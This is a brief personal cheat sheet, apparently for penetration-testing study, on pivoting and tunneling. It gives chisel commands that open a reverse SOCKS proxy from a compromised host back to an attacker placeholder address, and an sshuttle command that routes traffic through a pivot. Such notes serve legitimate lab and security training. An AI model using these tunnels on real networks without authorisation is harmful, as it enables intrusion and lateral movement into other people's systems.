# Pivoting & Tunneling Cheat Sheet

Only commands I have actually run and verified. Machine label on every block.
Placeholders: `<TARGET_IP>`, `<LHOST>`, `<USER>`, `<PASS>`, `<DOMAIN>`.

## Quick tunnels (reference)
```bash
# chisel reverse SOCKS proxy
# on attacker:
chisel server -p 1080 --reverse &
# on compromised host:
chisel client <ATTACKER_IP>:1080 R:socks
# then point proxychains at 127.0.0.1:1080

# sshuttle (route a subnet through SSH, needs creds on pivot)
sshuttle -r user@<PIVOT_IP> 0.0.0.0/0
```
> Full pivoting notes build out in this module (Ligolo-ng, proxychains, SSH -L/-R/-D).
